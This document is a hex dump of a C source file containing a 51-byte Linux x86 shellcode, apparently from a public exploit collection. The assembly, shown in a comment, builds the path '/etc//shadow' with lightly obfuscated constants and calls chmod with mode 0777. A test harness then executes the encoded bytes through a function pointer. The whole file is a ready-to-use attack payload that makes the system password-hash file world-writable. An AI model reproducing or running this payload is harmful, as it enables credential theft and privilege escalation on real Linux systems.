00000000  2f 2a 0a 3b 20 54 69 74  6c 65 3a 20 20 20 20 63  |/*.; Title:    c|
00000010  68 6d 6f 64 20 30 37 37  37 20 2f 65 74 63 2f 73  |hmod 0777 /etc/s|
00000020  68 61 64 6f 77 20 28 61  20 62 69 74 20 6f 62 66  |hadow (a bit obf|
00000030  75 73 63 61 74 65 64 29  20 53 68 65 6c 6c 63 6f  |uscated) Shellco|
00000040  64 65 20 2d 20 35 31 20  42 79 74 65 73 0a 3b 20  |de - 51 Bytes.; |
00000050  50 6c 61 74 66 6f 72 6d  3a 20 6c 69 6e 75 78 2f  |Platform: linux/|
00000060  78 38 36 0a 3b 20 44 61  74 65 3a 20 20 20 20 20  |x86.; Date:     |
00000070  32 30 31 34 2d 30 36 2d  32 32 0a 3b 20 41 75 74  |2014-06-22.; Aut|
00000080  68 6f 72 3a 20 20 20 4f  73 61 6e 64 61 20 4d 61  |hor:   Osanda Ma|
00000090  6c 69 74 68 20 4a 61 79  61 74 68 69 73 73 61 20  |lith Jayathissa |
000000a0  28 40 4f 73 61 6e 64 61  4d 61 6c 69 74 68 29 0a  |(@OsandaMalith).|
000000b0  0a 73 65 63 74 69 6f 6e  20 2e 74 65 78 74 0a 67  |.section .text.g|
000000c0  6c 6f 62 61 6c 20 5f 73  74 61 72 74 0a 0a 5f 73  |lobal _start.._s|
000000d0  74 61 72 74 3a 20 0a 6d  6f 76 20 65 62 78 2c 20  |tart: .mov ebx, |
000000e0  65 61 78 0a 78 6f 72 20  65 61 78 2c 20 65 62 78  |eax.xor eax, ebx|
000000f0  0a 70 75 73 68 20 64 77  6f 72 64 20 65 61 78 0a  |.push dword eax.|
00000100  6d 6f 76 20 65 73 69 2c  20 30 78 35 36 33 61 31  |mov esi, 0x563a1|
00000110  66 33 65 0a 61 64 64 20  65 73 69 2c 20 30 78 32  |f3e.add esi, 0x2|
00000120  31 33 35 34 35 32 33 0a  6d 6f 76 20 64 77 6f 72  |1354523.mov dwor|
00000130  64 20 5b 65 73 70 2d 34  5d 2c 20 65 73 69 0a 6d  |d [esp-4], esi.m|
00000140  6f 76 20 64 77 6f 72 64  20 5b 65 73 70 2d 38 5d  |ov dword [esp-8]|
00000150  2c 20 30 78 36 38 37 33  32 66 32 66 0a 6d 6f 76  |, 0x68732f2f.mov|
00000160  20 64 77 6f 72 64 20 5b  65 73 70 2d 31 32 5d 2c  | dword [esp-12],|
00000170  20 30 78 36 33 37 34 36  35 32 66 0a 73 75 62 20  | 0x6374652f.sub |
00000180  65 73 70 2c 20 31 32 0a  6d 6f 76 20 20 20 20 65  |esp, 12.mov    e|
00000190  62 78 2c 65 73 70 0a 70  75 73 68 20 77 6f 72 64  |bx,esp.push word|
000001a0  20 20 30 78 31 66 66 0a  70 6f 70 20 20 20 20 63  |  0x1ff.pop    c|
000001b0  78 0a 6d 6f 76 20 20 20  20 61 6c 2c 30 78 66 0a  |x.mov    al,0xf.|
000001c0  69 6e 74 20 20 20 20 30  78 38 30 0a 0a 2a 2f 0a  |int    0x80..*/.|
000001d0  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 64 69 6f  |.#include <stdio|
000001e0  2e 68 3e 0a 23 69 6e 63  6c 75 64 65 20 3c 73 74  |.h>.#include <st|
000001f0  72 69 6e 67 2e 68 3e 0a  0a 75 6e 73 69 67 6e 65  |ring.h>..unsigne|
00000200  64 20 63 68 61 72 20 63  6f 64 65 5b 5d 20 3d 20  |d char code[] = |
00000210  5c 0a 22 5c 78 38 39 5c  78 63 33 5c 78 33 31 5c  |\."\x89\xc3\x31\|
00000220  78 64 38 5c 78 35 30 5c  78 62 65 5c 78 33 65 5c  |xd8\x50\xbe\x3e\|
00000230  78 31 66 22 0a 22 5c 78  33 61 5c 78 35 36 5c 78  |x1f"."\x3a\x56\x|
00000240  38 31 5c 78 63 36 5c 78  32 33 5c 78 34 35 5c 78  |81\xc6\x23\x45\x|
00000250  33 35 5c 78 32 31 22 0a  22 5c 78 38 39 5c 78 37  |35\x21"."\x89\x7|
00000260  34 5c 78 32 34 5c 78 66  63 5c 78 63 37 5c 78 34  |4\x24\xfc\xc7\x4|
00000270  34 5c 78 32 34 5c 78 66  38 22 0a 22 5c 78 32 66  |4\x24\xf8"."\x2f|
00000280  5c 78 32 66 5c 78 37 33  5c 78 36 38 5c 78 63 37  |\x2f\x73\x68\xc7|
00000290  5c 78 34 34 5c 78 32 34  5c 78 66 34 22 0a 22 5c  |\x44\x24\xf4"."\|
000002a0  78 32 66 5c 78 36 35 5c  78 37 34 5c 78 36 33 5c  |x2f\x65\x74\x63\|
000002b0  78 38 33 5c 78 65 63 5c  78 30 63 5c 78 38 39 22  |x83\xec\x0c\x89"|
000002c0  0a 22 5c 78 65 33 5c 78  36 36 5c 78 36 38 5c 78  |."\xe3\x66\x68\x|
000002d0  66 66 5c 78 30 31 5c 78  36 36 5c 78 35 39 5c 78  |ff\x01\x66\x59\x|
000002e0  62 30 22 0a 22 5c 78 30  66 5c 78 63 64 5c 78 38  |b0"."\x0f\xcd\x8|
000002f0  30 22 3b 0a 0a 69 6e 74  0a 6d 61 69 6e 28 29 20  |0";..int.main() |
00000300  7b 0a 0a 20 20 20 20 20  20 20 70 72 69 6e 74 66  |{..       printf|
00000310  28 22 53 68 65 6c 6c 63  6f 64 65 20 4c 65 6e 67  |("Shellcode Leng|
00000320  74 68 3a 20 20 25 64 5c  6e 22 2c 20 73 74 72 6c  |th:  %d\n", strl|
00000330  65 6e 28 63 6f 64 65 29  29 3b 0a 20 20 20 20 20  |en(code));.     |
00000340  20 20 69 6e 74 20 28 2a  72 65 74 29 28 29 20 3d  |  int (*ret)() =|
00000350  20 28 69 6e 74 28 2a 29  28 29 29 63 6f 64 65 3b  | (int(*)())code;|
00000360  0a 20 20 20 20 20 20 20  72 65 74 28 29 3b 0a 0a  |.       ret();..|
00000370  72 65 74 75 72 6e 20 30  3b 0a 7d                 |return 0;.}|
0000037b
